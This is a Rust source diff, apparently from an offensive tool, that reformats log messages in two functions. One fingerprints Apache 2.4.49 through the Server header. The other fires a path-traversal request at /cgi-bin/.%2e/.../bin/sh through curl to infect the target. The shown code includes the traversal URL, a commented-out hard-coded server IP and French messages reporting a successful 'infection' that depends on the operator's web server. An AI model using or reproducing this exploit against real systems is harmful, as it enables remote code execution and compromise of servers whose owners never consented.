@@ -7,24 +7,24 @@ pub async fn get_apache_headers(target: String) -> Result<(), Box<dyn StdError>>
     let res = client.get(&url).send().await?;
 
     if let Some(server) = res.headers().get("Server") {
-        println!("Server: {:?}", server);
+        println!("[x] - Server: {:?}", server);
         if let Ok(server_str) = server.to_str() {
             if server_str.contains("Apache") {
-                println!("Server is Apache");
+                println!("[x] - Server is Apache");
                 if server_str.contains("2.4.49") {
-                    println!("Version is vulnerable");
+                    println!("[x] - Version is vulnerable");
                     return Ok(());
                 } else {
-                    return Err("Apache server version is not vulnerable".into());
+                    return Err("[!] - Apache server version is not vulnerable".into());
                 }
             } else {
-                return Err("Server is not Apache".into());
+                return Err("[!] - Server is not Apache".into());
             }
         } else {
-            return Err("Failed to convert server header to string".into());
+            return Err("[!] - Failed to convert server header to string".into());
         }
     } else {
-        return Err("Server header not found".into());
+        return Err("[!] - Server header not found".into());
     }
 }
 pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
@@ -34,7 +34,7 @@ pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
             let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
             //let srv:String = format!("51.77.193.65");
 
-            println!("{}", url);
+            println!("[?] - Lancement de l'exploit : {}", url);
 
             let command_output: Output = Command::new("curl")
                 .arg("-X")
@@ -56,12 +56,12 @@ pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
                 let result_str = String::from_utf8_lossy(&command_output.stdout);
                 println!("Output: {}", result_str);
                 if result_str.is_empty() {
-                    println!("Infection reussi - pas de message d'erreur si le serveur api est éteint ");
+                    println!("[x] - Infection reussi - **Vérifier que le serveur WEB est allumé !!**");
                 }
             }
         }
         Err(e) => {
-            eprintln!("Failed to exploit Apache: {}", e);
+            eprintln!("[!] - Apache : {} n'est pas vulnérable", target_ip);
         }
 
     }
